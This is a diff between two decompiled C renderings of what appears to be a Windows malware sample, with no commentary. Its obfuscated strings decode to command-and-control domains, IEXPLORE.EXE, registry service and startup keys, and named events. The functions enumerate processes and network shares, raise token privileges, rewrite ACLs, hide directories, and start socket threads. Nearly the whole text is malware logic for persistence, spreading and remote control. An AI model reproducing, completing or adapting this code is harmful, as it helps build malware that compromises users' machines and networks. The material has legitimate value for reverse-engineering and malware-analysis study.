@@ -53,6 +53,10 @@ struct _FILETIME {
     int32_t e1;
 };
 
+struct _IO_FILE {
+    int32_t e0;
+};
+
 struct _LUID {
     int32_t e0;
     int32_t e1;
@@ -178,6 +182,17 @@ struct _STARTUPINFOA {
     int32_t * e17;
 };
 
+struct _SYSTEMTIME {
+    int16_t e0;
+    int16_t e1;
+    int16_t e2;
+    int16_t e3;
+    int16_t e4;
+    int16_t e5;
+    int16_t e6;
+    int16_t e7;
+};
+
 struct _TOKEN_PRIVILEGES {
     int32_t e0;
     struct _LUID_AND_ATTRIBUTES e1[1];
@@ -256,46 +271,27 @@ struct timeval {
 
 // ------------------- Function Prototypes --------------------
 
-int32_t ___CxxFrameHandler(int32_t * pExcept, int32_t * pRN, int32_t * pContext, int32_t * pDC);
 int32_t __controlfp(int32_t NewValue, int32_t Mask);
-int32_t __EH_prolog(void);
-int32_t __except_handler3(struct _EXCEPTION_RECORD * exception_record, int32_t registration, struct _CONTEXT * context, int32_t dispatcher);
-void __initterm(void (**First)(), void (**Last)());
-int32_t __XcptFilter(int32_t xcptnum, int32_t * pxcptinfoptrs);
-int32_t * _CreateToolhelp32Snapshot(int32_t dwFlags, int32_t th32ProcessID);
-int32_t * _memcpy_1(int32_t * dest, int32_t * src, int32_t n);
-int32_t * _memset(int32_t * s, int32_t c, int32_t n);
-bool _Process32First(int32_t * hSnapshot, struct tagPROCESSENTRY32 * lppe);
-bool _Process32Next(int32_t * hSnapshot, struct tagPROCESSENTRY32 * lppe);
-int32_t _SetEntriesInAclA(int32_t cCountOfExplicitEntries, struct _EXPLICIT_ACCESS_A * pListOfExplicitEntries, struct _ACL * OldAcl, struct _ACL ** NewAcl);
-int32_t _SetSecurityInfo(int32_t * handle, int32_t ObjectType, int32_t SecurityInfo, int32_t * psidOwner, int32_t * psidGroup, struct _ACL * pDacl, struct _ACL * pSacl);
-char * _strcat(char * dest, char * src);
-int32_t _strcmp(char * s1, char * s2);
-char * _strcpy(char * dest, char * src);
-int32_t _strlen(char * s);
-int32_t _WNetCloseEnum(int32_t * hEnum);
-int32_t _WNetEnumResourceA(int32_t * hEnum, int32_t * lpcCount, int32_t * lpBuffer, int32_t * lpBufferSize);
-int32_t _WNetOpenEnumA(int32_t dwScope, int32_t dwType, int32_t dwUsage, struct _NETRESOURCEA * lpNetResource, int32_t ** lphEnum);
 int32_t entry_point(void);
 int32_t function_401000(int32_t a1);
 int32_t function_401041(void);
 int32_t function_401047(char * a1);
 int32_t function_401059(char * a1);
 int32_t function_40106c(int32_t a1, int32_t a2, int32_t a3, int32_t a4);
-int32_t function_401414(struct _SECURITY_ATTRIBUTES * lpPathName);
+int32_t function_401414(void);
 int32_t function_401435(void);
 int32_t function_401454(int32_t a1);
 int32_t function_4015ab(void);
-int32_t function_4015d4(int32_t lpValueName, int32_t a2);
+int32_t function_4015d4(char * lpValueName, int32_t a2);
 int32_t function_4016a4(void);
-int32_t function_4018c1(struct _OSVERSIONINFOA * a1);
+int32_t function_4018c1(struct _OSVERSIONINFOA * lpVersionInformation);
 int32_t function_4018ff(void);
-int32_t function_4019e2(struct sockaddr * a1, int32_t protocol, int32_t a3, int32_t a4, int32_t a5, int32_t a6, int32_t a7, int32_t a8);
+int32_t function_4019e2(struct timeval * a1, int32_t a2, int32_t a3, int32_t a4, int32_t a5, int32_t a6, int32_t a7, int32_t a8);
 int32_t function_401bab(void);
 int32_t function_401c03(void);
 int32_t function_401def(void);
-int32_t function_401e4c(int32_t str, int32_t a2);
-int32_t function_401e99(char * a1, int32_t a2);
+int32_t function_401e4c(int32_t a1, int32_t a2);
+int32_t function_401e99(int32_t a1, int32_t a2);
 int32_t function_401f45(char * a1, int32_t a2);
 int32_t function_402006(void);
 int32_t function_40205c(void);
@@ -303,46 +299,101 @@ int32_t function_40216f(void);
 int32_t function_4022eb(void);
 int32_t function_4023c2(void);
 int32_t function_402508(void);
-int32_t function_40267d(char * str, int32_t str3, int32_t a3, int32_t str5, int32_t a5, int32_t a6);
-int32_t function_40277e(int32_t sock);
+int32_t function_40267d(char * str, int32_t str3);
+int32_t function_40277e(void);
 int32_t function_402830(int32_t a1, int32_t a2, char * a3, int32_t result);
 int32_t function_402859(void);
 int32_t function_4028cc(char * name, int32_t a2, int32_t a3, int32_t a4);
 int32_t function_4028eb(void);
 int32_t function_402aa7(void);
+int32_t function_402ced(void);
+int32_t function_402d26(void);
 int32_t function_402d8f(void);
 int32_t function_402ece(void);
-int32_t function_402f2f(char * a1);
+int32_t function_402f2f(void);
 int32_t function_402f9b(void);
 int32_t function_4030c7(void);
-int32_t function_40328d(int32_t * a1, int32_t a2);
-int32_t function_403319(int32_t * TokenHandle, int32_t lpName, int32_t PreviousState);
-int32_t function_403379(int32_t * TokenHandle, int32_t NewState);
-int32_t function_40338e(int32_t ** a1, int32_t dwDesiredAccess);
-int32_t function_4034cb(char * str);
+int32_t function_40328d(void);
+int32_t function_403319(int32_t * TokenHandle, int32_t a2, int32_t PreviousState);
+int32_t function_403379(void);
+int32_t function_40338e(int32_t ** a1);
+int32_t function_4034cb(void);
 int32_t function_403587(void);
-int32_t function_403887(int32_t * a1);
-int32_t function_4038e7(int32_t dwProcessId);
+int32_t function_403887(int32_t a1);
+int32_t function_4038c8(void);
+int32_t function_4038e7(int32_t a1);
+int32_t function_403929(void);
+int32_t function_403948(void);
+int32_t function_403966(void);
+int32_t function_403a21(void);
+int32_t function_403a58(void);
+int32_t function_403ae7(void);
+int32_t function_403b07(void);
 int32_t function_403b42(void);
-int32_t function_403cd5(int32_t * hFindFile, int32_t lpFindFileData);
+int32_t function_403cd5(void);
 int32_t function_403d21(char * lpFileName);
 int32_t function_403d8d(int32_t a1);
 int32_t function_403dda(char * a1);
-int32_t function_4047d2(struct _FILETIME * lpFileName);
+int32_t function_403e89(int32_t a1);
+int32_t function_403eae(struct _WIN32_FIND_DATAA * a1, uint32_t a2);
+int32_t function_4040c4(void);
+int32_t function_404140(struct _WIN32_FIND_DATAA * a1, int32_t a2);
+int32_t function_404354(char * str, int32_t a2);
+int32_t function_40439c(int32_t * a1, int32_t a2);
+int32_t function_404511(void);
+int32_t function_404524(int32_t a1);
+int32_t function_404569(void);
+int32_t function_4045cb(void);
+int32_t function_404629(void);
+int32_t function_404655(void);
+int32_t function_4047d2(void);
 int32_t function_404889(void);
 int32_t function_404905(void);
-int32_t function_404b80(int32_t a1, int32_t a2);
-int32_t function_404ba8(int16_t * str2, int32_t a2);
-int32_t function_404dde(int32_t a1, struct fd_set * str3);
-int32_t function_404fd1(struct fd_set * a1, int32_t a2, int32_t a3, int32_t a4, int32_t str, int32_t a6);
-int32_t function_40511a(struct _STARTUPINFOA * str);
-int32_t function_405908(int32_t * hKey, int32_t a2, int32_t lpValueName, int32_t dwType, int32_t lpData, int32_t cbData, int32_t a7);
-int32_t function_405957(int32_t * hKey, int32_t lpSubKey, int32_t lpSubKey2);
+int32_t function_404b80(void);
+int32_t function_404ba8(char * a1, int32_t lpWideCharStr);
+int32_t function_404dde(char * a1, int32_t a2);
+int32_t function_404fd1(void);
+int32_t function_405103(void);
+int32_t function_405119(void);
+int32_t function_40511a(char * str);
+int32_t function_4051f5(void);
+int32_t function_405222(void);
+int32_t function_40554c(void);
+int32_t function_4055cd(void);
+int32_t function_4055f3(void);
+int32_t function_405676(void);
+int32_t function_4056ae(void);
+int32_t function_4056fc(void);
+int32_t function_405734(void);
+int32_t function_40576c(char * hKey, int32_t a2, int32_t lpName);
+int32_t function_4057de(int32_t * hKey, int32_t a2, int32_t dwIndex);
+int32_t function_40586a(int32_t * hKey, int32_t a2, int32_t a3);
+int32_t function_4058c4(int32_t * hKey, int32_t a2, int32_t lpValueName);
+int32_t function_405908(int32_t * hKey, int32_t a2, int32_t lpValueName, int32_t dwType, int32_t lpData, int32_t cbData);
+int32_t function_405957(int32_t * hKey, int32_t a2, int32_t lpSubKey2);
+int32_t function_4059b2(int32_t * handle, int32_t ObjectType, int32_t SecurityInfo, int32_t * psidOwner, int32_t * psidGroup, struct _ACL * pDacl, struct _ACL * pSacl);
+int32_t function_4059b8(int32_t cCountOfExplicitEntries, struct _EXPLICIT_ACCESS_A * pListOfExplicitEntries, struct _ACL * OldAcl, struct _ACL ** NewAcl);
+int32_t function_4059be(int32_t * hEnum);
+int32_t function_4059c4(int32_t * hEnum, int32_t * lpcCount, int32_t * lpBuffer, int32_t * lpBufferSize);
+int32_t function_4059ca(int32_t dwScope, int32_t dwType, int32_t dwUsage, struct _NETRESOURCEA * lpNetResource, int32_t ** lphEnum);
+int32_t function_4059d0(int32_t * pExcept, int32_t * pRN, int32_t * pContext, int32_t * pDC);
+int32_t function_4059e0(void);
+char * function_4059e6(char * dest, char * src);
+char * function_4059ec(char * dest, char * src);
+int32_t function_4059f2(char * s);
+int32_t * function_4059f8(int32_t * s, int32_t c, int32_t n);
+int32_t * function_4059fe(int32_t * dest, int32_t * src, int32_t n);
 int32_t function_405a10(void);
+int32_t function_405a40(char * s1, char * s2);
 int32_t function_405b84(void);
-void function_405b98(int32_t Code);
-int32_t function_405bb0(void);
+int32_t function_405ba4(int32_t xcptnum, int32_t * pxcptinfoptrs);
+void function_405baa(void (**First)(), void (**Last)());
+int32_t function_405bc2(void);
 int32_t function_405bc5(void);
+int32_t function_405bc6(struct _EXCEPTION_RECORD * exception_record, int32_t registration, struct _CONTEXT * context, int32_t dispatcher);
+bool function_405be0(int32_t * hSnapshot, struct tagPROCESSENTRY32 * lppe);
+bool function_405be6(int32_t * hSnapshot, struct tagPROCESSENTRY32 * lppe);
+int32_t * function_405bec(int32_t dwFlags, int32_t th32ProcessID);
 int32_t function_405bf4(void);
 
 // --------------------- Global Variables ---------------------
@@ -352,80 +403,86 @@ int32_t g2 = 0; // ebp
 int32_t g3 = 0; // ebx
 int32_t g4 = 0; // ecx
 int32_t g5 = 0; // edi
-int32_t g6 = 0; // esi
-int32_t g7 = 0; // esp
-int32_t g8 = 0x402b93;
+int32_t g6 = 0; // edx
+int32_t g7 = 0; // esi
+int32_t g8 = 0; // esp
 int32_t g9 = 0x35ff006a;
 int32_t g10 = 0x706f754f;
 char * g11 = "\x4c\x6e\x6b\x63\x6e\x5d\x69\x1c\x42\x65\x68\x61\x6f";
-struct tagPROCESSENTRY32 * g12 = (struct tagPROCESSENTRY32 *)0x706a4558;
+struct _SECURITY_ATTRIBUTES * g12 = (struct _SECURITY_ATTRIBUTES *)0x706a4558;
 char g13[2] = "\\";
-int32_t g14 = 41;
-int32_t g15 = 40;
-char g16[2] = ".";
-int16_t * g17 = (int16_t *)0x49939393;
-char * g18 = "\x93\x93\x93\x37\x6c\xc0\xde\xd1\xe0\x93\x93\x93\x93\x8b\x94\x5b\x93\x93\x93\x93\x93\x93\x93\x93\x93\x93\x93\x93\x93\x93\x6c\x6d\x93\x93\x83\x93\x9f\x6c\x93\x37\x93\x97\x82\x99\x93\x93\x93\x93\x93\x93\x93\xb3\x93\x93\x93\x93\x93\x47\x93\x93\x13\xfa\x93\xdd\xc7\xdf\xde\xc0\xc0\xc3\x93\x92\x93\x93\x93\x04\x11\x9b\x73\x93\x93\x93\x93\x93\x93\x93\x93\x93\x93\x93\x93\x93\x93\x93\x93\x93\xc4\x93\xfa\x93\xfd\x93\xf7\x93\xfc\x93\xe4\x93\xe0\x93\xb3\x93\xa1\x93\xa3\x93\xa3\x93\xa3\x93\xb3\x93\xa1\x93\xa2\x93\xaa\x93\xa6\x93\x93\x93\xc4\x93\xfa\x93\xfd\x93\xf7\x93\xfc\x93\xe4\x93\xe0\x93\xb3\x93\xa1\x93\xa3\x93\xa3\x93\xa3\x93\xb3\x93\xa6\x93\xbd\x93\xa3\x93\x93\x93\x93\x93";
-int16_t * g19 = (int16_t *)0x16939393;
-int32_t g20 = 0;
-int32_t g21 = 0;
+bool g14 = true;
+int32_t g15 = 41;
+int32_t g16 = 40;
+char g17[2] = ".";
+char * g18 = "\x93\x93\x93\x49\x6c\xc0\xde\xd1\xe0\x93\x93\x93\x93\x8b\x94\x5b\x93\x93\x93\x93\x93\x93\x93\x93\x93\x93\x93\x93\x93\x93\x6c\x6d\x93\x9b\xb3\x93\x9f\x6c\x93\x49\x93\x97\x82\x99\x93\x93\x93\x93\x93\x93\x93\xc4\x93\x93\x93\x93\x93\x47\x93\x93\x13\x0c\x93\xdd\xc7\xdf\xde\xc0\xc0\xc3\x93\x90\x93\x93\x93\x92\x93\x92\x93\xd5\x93\x93\x93\x93\x93\x93\x93\xd4\x93\x93\x93\x93\x93\x93\x93\xd3\x93\x93\x93\x93\x93\x93\x93\xd3\x93\x93\x93\x95\x93\x95\x93\xd3\x93\x93\x93\x83\x93\x83\x93\xd4\x93\x93\x93\x86\x19\x1b\x73\xdb\x93\xdc\x93\xd7\x93\x93\x12\x8a\xf9\xe9\x61\x77\xda\x8f\xbb\x3c\xa3\xb6\xe7\x83\xf4\xc0\xc4\x93\xfa\x93\xfd\x93\xf7\x93\xfc\x93\xe4\x93\xe0\x93\xb3\x93\xa1\x93\xa3\x93\xa3\x93\xa3\x93\xb3\x93\xa1\x93\xa2\x93\xaa\x93\xa6\x93\x93\x93\xc4\x93\xfa\x93\xfd\x93\xf7\x93\xfc\x93\xe4\x93\xe0\x93\xb3\x93\xa1\x93\xa3\x93\xa3\x93\xa3\x93\xb3\x93\xa6\x93\xbd\x93\xa3\x93\x93\x93\x93\x93";
+char * g19 = "\x93\x93\x93\x37\x6c\xc0\xde\xd1\xe0\x93\x93\x93\x93\x8b\x94\x5b\x93\x93\x93\x93\x93\x93\x93\x93\x93\x93\x93\x93\x93\x93\x6c\x6d\x93\x93\x83\x93\x9f\x6c\x93\x37\x93\x97\x82\x99\x93\x93\x93\x93\x93\x93\x93\xb3\x93\x93\x93\x93\x93\x47\x93\x93\x13\xfa\x93\xdd\xc7\xdf\xde\xc0\xc0\xc3\x93\x92\x93\x93\x93\x04\x11\x9b\x73\x93\x93\x93\x93\x93\x93\x93\x93\x93\x93\x93\x93\x93\x93\x93\x93\x93\xc4\x93\xfa\x93\xfd\x93\xf7\x93\xfc\x93\xe4\x93\xe0\x93\xb3\x93\xa1\x93\xa3\x93\xa3\x93\xa3\x93\xb3\x93\xa1\x93\xa2\x93\xaa\x93\xa6\x93\x93\x93\xc4\x93\xfa\x93\xfd\x93\xf7\x93\xfc\x93\xe4\x93\xe0\x93\xb3\x93\xa1\x93\xa3\x93\xa3\x93\xa3\x93\xb3\x93\xa6\x93\xbd\x93\xa3\x93\x93\x93\x93\x93";
+char * g20 = "\x93\x93\x93\x16\x6c\xc0\xde\xd1\xe1\x93\x93\x93\x93\x8b\xc0\x5b\x93\x93\x93\x93\x93\x93\x93\x93\x93\x93\x93\x93\x93\x93\x6c\x6d\x93\x93\x93\x93\x93\xf1\x93\x91\xc3\xd0\xb3\xdd\xd6\xc7\xc4\xdc\xc1\xd8\xb3\xc3\xc1\xdc\xd4\xc1\xd2\xde\xb3\xa2\xbd\xa3\x93\x91\xdf\xd2\xdd\xde\xd2\xdd\xa2\xbd\xa3\x93\x91\xc4\xfa\xfd\xf7\xfc\xe4\xe0\xb3\xf5\xfc\xe1\xb3\xc4\xfc\xe1\xf8\xf4\xe1\xfc\xe6\xe3\xe0\xb3\xa0\xbd\xa2\xf2\x93\x91\xdf\xde\xa2\xbd\xa1\xcb\xa3\xa3\xa1\x93\x91\xdf\xd2\xdd\xde\xd2\xdd\xa1\xbd\xa2\x93\x91\xdd\xc7\xb3\xdf\xde\xb3\xa3\xbd\xa2\xa1\x93";
+char * g21;
 int32_t g22 = 0;
-char * g23;
+int32_t g23 = 0;
 int32_t g24 = 0;
-int32_t g25 = 0;
+char * g25;
 int32_t g26 = 0;
-struct _WIN32_FIND_DATAA * g27 = NULL;
-struct _WIN32_FIND_DATAA * g28 = NULL;
-char g29 = 0;
-char g30 = 0;
-struct _NETRESOURCEA * g31 = NULL;
-int32_t g32 = 0;
-int32_t g33 = 0;
-struct fd_set * g34 = NULL;
-char * g35;
-int32_t ** g36 = NULL;
-int32_t g37 = 0;
+int32_t g27 = 0;
+int32_t g28 = 0;
+struct _WIN32_FIND_DATAA * g29 = NULL;
+struct _WIN32_FIND_DATAA * g30 = NULL;
+char g31 = 0;
+char g32 = 0;
+struct _NETRESOURCEA * g33 = NULL;
+int32_t g34 = 0;
+int32_t g35 = 0;
+char * g36;
+char * g37;
 int32_t g38 = 0;
-int32_t g39 = 0;
+struct _SECURITY_ATTRIBUTES * g39 = NULL;
 int32_t g40 = 0;
 int32_t g41 = 0;
 int32_t g42 = 0;
 int32_t g43 = 0;
 int32_t g44 = 0;
-int32_t g45 = 0;
+struct _SECURITY_ATTRIBUTES * g45 = NULL;
 int32_t g46 = 0;
-char * g47;
-struct _SECURITY_ATTRIBUTES * g48 = NULL;
+struct _SECURITY_ATTRIBUTES * g47 = NULL;
+int32_t g48 = 0;
 char * g49;
-char * g50;
-int32_t g51 = 0;
-int32_t g52 = 0;
-struct timeval * g53 = NULL;
+struct _SECURITY_ATTRIBUTES * g50 = NULL;
+char * g51;
+char * g52;
+int32_t g53 = 0;
 int32_t g54 = 0;
 int32_t g55 = 0;
 int32_t g56 = 0;
-struct timeval * g57 = NULL;
-int16_t g58 = 0;
-char * g59;
-int16_t g60 = 0;
-char * g61;
-int32_t g62 = 0;
-char * g63;
-char * g64;
-char g65 = 0;
-struct _OVERLAPPED * g66 = NULL;
-int32_t g67 = 0;
-struct timeval * g68 = NULL;
+int32_t g57 = 0;
+int32_t g58 = 0;
+int32_t g59 = 0;
+char * g60;
+int16_t g61 = 0;
+char * g62;
+char g63 = 0;
+int16_t g64 = 0;
+int32_t g65 = 0;
+int32_t g66 = 0;
+char * g67;
+char * g68;
+char g69 = 0;
+char * g70;
+int32_t g71 = 0;
+int32_t g72 = 0;
+int32_t g73 = 0;
+char * g74;
 
 // ------------------------ Functions -------------------------
 
-// Address range: 0x401000 - 0x401040
+// Address range: 0x401000 - 0x401041
 int32_t function_401000(int32_t a1) {
-    // entry
-    __EH_prolog();
+    // 0x401000
+    function_4059e0();
     *(int32_t *)(g2 - 4) = 0;
     int32_t v1 = g5; // bp-16
     *(int32_t *)(g2 - 16) = (int32_t)&v1;
-    if (function_40106c(v1, g6, g3, g4) != 0) {
+    if (function_40106c(v1, g7, g3, g4) != 0) {
         // 0x401023
         function_402508();
         WSACleanup();
@@ -436,13 +493,13 @@ int32_t function_401000(int32_t a1) {
     // UNREACHABLE
 }
 
-// Address range: 0x401041 - 0x401046
+// Address range: 0x401041 - 0x401047
 int32_t function_401041(void) {
     // 0x401041
     return 0x401028;
 }
 
-// Address range: 0x401047 - 0x401058
+// Address range: 0x401047 - 0x401059
 int32_t function_401047(char * a1) {
     int32_t result = (int32_t)a1; // 0x401047
     unsigned char v1 = *a1; // 0x40104b2
@@ -473,7 +530,7 @@ int32_t function_401047(char * a1) {
     return result2;
 }
 
-// Address range: 0x401059 - 0x40106b
+// Address range: 0x401059 - 0x40106c
 int32_t function_401059(char * a1) {
     int32_t result = (int32_t)a1; // 0x401059
     unsigned char v1 = *a1; // 0x40105d2
@@ -504,13 +561,9 @@ int32_t function_401059(char * a1) {
     return result2;
 }
 
-// Address range: 0x40106c - 0x401413
+// Address range: 0x40106c - 0x401414
 int32_t function_40106c(int32_t a1, int32_t a2, int32_t a3, int32_t a4) {
-    int32_t lpThreadId = g4; // bp-4
-    int32_t v1 = g3; // 0x40106d
-    int32_t v2 = g2; // 0x40106e
-    int32_t v3 = g6; // 0x40106f
-    int32_t v4 = g5; // 0x401070
+    // 0x40106c
     function_401059("&ha_j]?&");
     function_401059("Okbps]naXIe_nkokbpX?qnnajpJapEjb");
     function_401059("OUOPAIX?qnnajp?kjpnkhOapX?kjpnkhXHo]");
@@ -519,16 +572,19 @@ int32_t function_40106c(int32_t a1, int32_t a2, int32_t a3, int32_t a4) {
     g2 = (int32_t)"Hd^mjnjao@sdo";
     function_401059("Hd^mjnjao@sdo");
     function_401059("Ie_nkokbpD]raAtep");
-    g3 = (int32_t)"Hd^mjnjaoC\\q`<^f";
+    int32_t lpName = (int32_t)"Hd^mjnjaoC\\q`<^f"; // ebx
     function_401059("Hd^mjnjaoC\\q`<^f");
     function_401059("EATLHKNA*ATA");
     function_401059("+ran*dpi");
     function_401059("+ata*dpi");
+    struct _SECURITY_ATTRIBUTES * lpThreadId = (struct _SECURITY_ATTRIBUTES *)"+]ll*dpi"; // bp-52
     function_401059("+]ll*dpi");
     function_401059("+iu]ll*dpi");
     function_401059("+dkopheop*dpi");
     int32_t str2 = (int32_t)"*]\\f)coh"; // edi
     function_401059("*]\\f)coh");
+    struct _SECURITY_ATTRIBUTES * v1 = (struct _SECURITY_ATTRIBUTES *)"+OkiaQlHeop*dpi"; // bp-68
+    int32_t v2 = (int32_t)&v1; // 0x401112
     function_401059("+OkiaQlHeop*dpi");
     function_401059("+OkiaQlRan*dpi");
     function_401059("sss*bhua]chao*_ki");
@@ -548,597 +604,815 @@ int32_t function_40106c(int32_t a1, int32_t a2, int32_t a3, int32_t a4) {
     function_401059("bkn_acqaop");
     function_401047((char *)g2);
     function_401047((char *)str2);
-    function_401047((char *)(int32_t (*)(int32_t *))g3);
+    function_401047((char *)lpName);
     function_401059("=q`ekLknp");
     function_401059("=q`ekLknp*ouo");
     function_401059("OUOPAIX?qnnajp?kjpnkhOapXOanre_ao");
+    lpThreadId = (struct _SECURITY_ATTRIBUTES *)"OUOPAIX?kjpnkhOap,,-XOanre_ao";
     function_401059("OUOPAIX?kjpnkhOap,,-XOanre_ao");
     function_401059("OUOPAIX?kjpnkhOap,,.XOanre_ao");
     function_401059("X`neranoX");
     function_401059("X@neranJqi*`]p");
-    strcpy((char *)&g50, "sss*bhua]chao*_ki");
-    strcpy((char *)&g49, "sss*gi)ju_*_ki");
-    strcpy((char *)&g48, "EATLHKNA*ATA");
+    v1 = (struct _SECURITY_ATTRIBUTES *)"sss*bhua]chao*_ki";
+    strcpy((char *)&g52, "sss*bhua]chao*_ki");
+    strcpy((char *)&g51, "sss*gi)ju_*_ki");
+    strcpy((char *)&g50, "EATLHKNA*ATA");
+    strcpy((char *)&g49, (char *)str);
+    strcat((char *)&g49, "+`evde*ceb");
+    strcpy((char *)&g48, (char *)str);
+    lpThreadId = (struct _SECURITY_ATTRIBUTES *)&g48;
+    strcat((char *)&g48, "+_kjja_p*ceb");
     strcpy((char *)&g47, (char *)str);
-    strcat((char *)&g47, "+`evde*ceb");
+    v1 = (struct _SECURITY_ATTRIBUTES *)&g47;
+    strcat((char *)&g47, "+ran*dpi");
     strcpy((char *)&g46, (char *)str);
-    strcat((char *)&g46, "+_kjja_p*ceb");
-    strcpy((char *)&g45, (char *)str);
-    strcat((char *)&g45, "+ran*dpi");
-    strcpy((char *)&g44, (char *)str);
-    strcat((char *)&g44, "+ata*dpi");
-    strcpy((char *)&g39, (char *)str);
-    strcat((char *)&g39, "+OkiaQlRan*dpi");
-    strcpy((char *)&g38, (char *)str);
-    strcat((char *)&g38, "+OkiaQlHeop*dpi");
-    strcpy((char *)&g43, (char *)str);
-    strcat((char *)&g43, "+]ll*dpi");
-    strcpy((char *)&g42, (char *)str);
-    strcat((char *)&g42, "+iu]ll*dpi");
+    strcat((char *)&g46, "+ata*dpi");
     strcpy((char *)&g41, (char *)str);
-    strcat((char *)&g41, "+dkopheop*dpi");
+    strcat((char *)&g41, "+OkiaQlRan*dpi");
     strcpy((char *)&g40, (char *)str);
-    strcat((char *)&g40, (char *)str2);
-    g6 = *(int32_t *)0x406114;
+    lpThreadId = (struct _SECURITY_ATTRIBUTES *)&g40;
+    strcat((char *)&g40, "+OkiaQlHeop*dpi");
+    strcpy((char *)&g45, (char *)str);
+    v1 = (struct _SECURITY_ATTRIBUTES *)&g45;
+    strcat((char *)&g45, "+]ll*dpi");
+    strcpy((char *)&g44, (char *)str);
+    strcat((char *)&g44, "+iu]ll*dpi");
+    strcpy((char *)&g43, (char *)str);
+    strcat((char *)&g43, "+dkopheop*dpi");
+    strcpy((char *)&g42, (char *)str);
+    lpThreadId = (struct _SECURITY_ATTRIBUTES *)&g42;
+    strcat((char *)&g42, (char *)str2);
     g5 = 0;
-    int32_t lpEventAttributes = g5; // 0x40136b
-    g22 = (int32_t)CreateEventA(NULL, false, false, (char *)g2);
-    int32_t lpEventAttributes2 = g5; // 0x401376
-    g21 = (int32_t)CreateEventA((struct _SECURITY_ATTRIBUTES *)(int32_t (*)(int32_t *))lpEventAttributes, (lpEventAttributes & 1) != 0, (lpEventAttributes & 1) != 0, "Ie_nkokbpD]raAtep");
-    g20 = (int32_t)CreateEventA((struct _SECURITY_ATTRIBUTES *)(int32_t (*)(int32_t *))lpEventAttributes2, (lpEventAttributes2 & 1) != 0, (lpEventAttributes2 & 1) != 0, (char *)g3);
+    int32_t v3 = g5; // 0x40136b
+    struct _SECURITY_ATTRIBUTES * lpEventAttributes = (struct _SECURITY_ATTRIBUTES *)v3; // 0x40136d
+    lpThreadId = lpEventAttributes;
+    g24 = (int32_t)CreateEventA(NULL, false, false, (char *)g2);
+    int32_t v4 = g5; // 0x401376
+    struct _SECURITY_ATTRIBUTES * lpEventAttributes2 = (struct _SECURITY_ATTRIBUTES *)v4; // 0x401378
+    v1 = lpEventAttributes2;
+    g23 = (int32_t)CreateEventA(lpEventAttributes, (v3 & 1) != 0, (v3 & 1) != 0, "Ie_nkokbpD]raAtep");
+    g22 = (int32_t)CreateEventA(lpEventAttributes2, (v4 & 1) != 0, (v4 & 1) != 0, (char *)lpName);
     if (function_401435() == 0) {
+        // 0x40106c
+        // branch -> 0x4013ee
         // 0x4013ee
         // branch -> 0x40140e
         // 0x40140e
-        g5 = v4;
-        g6 = v3;
-        g2 = v2;
-        g3 = v1;
+        g2 = *(int32_t *)(g8 + 8);
         return 0;
     }
     // 0x40138e
-    function_4018c1((struct _OSVERSIONINFOA *)&g61);
-    g59 = (char *)(int32_t)(function_4018ff() != 0);
+    function_4018c1((struct _OSVERSIONINFOA *)&g65);
+    g62 = (char *)(int32_t)(function_4018ff() != 0);
     function_401454(g5);
     function_4016a4();
     function_402859();
     function_402006();
     function_4022eb();
     function_4023c2();
-    g6 = 0x6b74;
     int32_t mem = (int32_t)malloc(0x2000); // 0x4013d3
-    g32 = mem;
+    g34 = mem;
     if (mem != g5) {
         int32_t * mem2 = malloc(0x2000); // 0x4013e2
-        g31 = (struct _NETRESOURCEA *)mem2;
+        g33 = (struct _NETRESOURCEA *)mem2;
         if ((int32_t)mem2 != g5) {
             // 0x4013f2
             function_4015ab();
-            CreateThread((struct _SECURITY_ATTRIBUTES *)g5, g5, (int32_t (*)(int32_t *))&g9, (int32_t *)g5, g5, &lpThreadId);
+            struct _SECURITY_ATTRIBUTES * lpThreadAttributes = (struct _SECURITY_ATTRIBUTES *)g5; // 0x401403
+            struct _SECURITY_ATTRIBUTES * v5 = lpThreadAttributes; // bp-92
+            CreateThread(lpThreadAttributes, g5, (int32_t (*)(int32_t *))&g9, (int32_t *)g5, g5, (int32_t *)&lpThreadId);
             // branch -> 0x40140e
             // 0x40140e
-            g5 = v4;
-            g6 = v3;
-            g2 = v2;
-            g3 = v1;
+            g2 = *(int32_t *)((int32_t)&v5 + 8);
             return 1;
         }
     }
     // 0x4013ee
     // branch -> 0x40140e
     // 0x40140e
-    g5 = v4;
-    g6 = v3;
-    g2 = v2;
-    g3 = v1;
+    g2 = *(int32_t *)(v2 + 8);
     return 0;
 }
 
-// Address range: 0x401414 - 0x401434
-int32_t function_401414(struct _SECURITY_ATTRIBUTES * lpPathName) {
+// Address range: 0x401414 - 0x401435
+int32_t function_401414(void) {
     // 0x401414
+    int32_t lpPathName;
     CreateDirectoryA((char *)lpPathName, NULL);
     int32_t v1 = GetFileAttributesA((char *)lpPathName); // 0x401423
-    return SetFileAttributesA((char *)(int32_t)lpPathName, v1 & 249 | 0x1000000 * v1 / 0x1000000 & -256 | 6);
+    return SetFileAttributesA((char *)lpPathName, v1 | 6);
 }
 
-// Address range: 0x401435 - 0x401453
+// Address range: 0x401435 - 0x401454
 int32_t function_401435(void) {
     int32_t v1 = 0; // bp-400
     return WSAStartup(2, (struct WSAData *)&v1) != 0 ? 2 : 1;
 }
 
-// Address range: 0x401454 - 0x4015aa
+// Address range: 0x401454 - 0x4015ab
 int32_t function_401454(int32_t a1) {
-    int32_t v1 = g3; // bp-656
-    int32_t lpReserved = 0; // ebx
-    int32_t v2 = g5; // 0x401461
+    int32_t hModule = 0; // ebx
     int32_t lpcbData = 128; // bp-12
-    int32_t v3 = 0; // esi
+    int32_t v1 = 0; // esi
     int32_t phkResult; // bp-8
-    RegCreateKeyExA(HKEY_LOCAL_MACHINE, "Okbps]naXIe_nkokbpX?qnnajpJapEjb", 0, (char *)&g68, 0, 0x2001f, NULL, (int32_t **)&phkResult, NULL);
-    char lpData; // bp-140
-    int32_t v4 = &lpData; // 0x401491
-    int32_t v5 = RegQueryValueExA(&((struct timeval *)phkResult)->e0, "pid", (int32_t *)lpReserved, &((struct _SECURITY_ATTRIBUTES *)lpReserved)->e0, &lpData, &lpcbData); // 0x4014a2
-    int32_t v6; // eax
+    RegCreateKeyExA(HKEY_LOCAL_MACHINE, "Okbps]naXIe_nkokbpX?qnnajpJapEjb", 0, (char *)&g74, 0, 0x2001f, NULL, (int32_t **)&phkResult, NULL);
+    int32_t v2 = &lpcbData; // 0x40148d
+    int32_t lpData; // bp-140
+    int32_t v3 = &lpData; // 0x401491
+    int32_t * lpReserved = (int32_t *)hModule; // 0x4014a2
+    int32_t v4 = RegQueryValueExA((int32_t *)phkResult, "pid", lpReserved, lpReserved, (char *)&lpData, &lpcbData); // 0x4014a2
+    int32_t v5; // eax
+    int32_t v6; // edi
